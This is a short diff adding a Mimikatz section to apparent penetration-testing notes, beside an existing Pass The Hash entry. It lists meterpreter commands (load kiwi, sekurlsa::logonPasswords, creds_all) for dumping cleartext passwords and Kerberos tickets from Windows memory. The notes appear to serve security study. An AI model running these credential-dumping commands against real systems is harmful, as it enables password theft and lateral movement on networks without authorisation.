@@ -86,5 +86,15 @@ Pass The Hash
 By using hashes gathered during initial exploitation, we can move laterally on the network by performing Pass The Hash attack.
 Metasploit -> exploit/windows/smb/psexec
 
+Mimikatz
+It is used to dump cleartext password, Kerberos ticket, etc from Windows system memory.
+Once you have a meterpreter shell, you can load mimikatz
+load mimikatz
+load kiwi
+-> mimikatz_command -f sekurlsa::logonPasswords
+-> mimikatz_command -f sekurlsa::searchPasswords
+-> creds_all
+
+
 
 
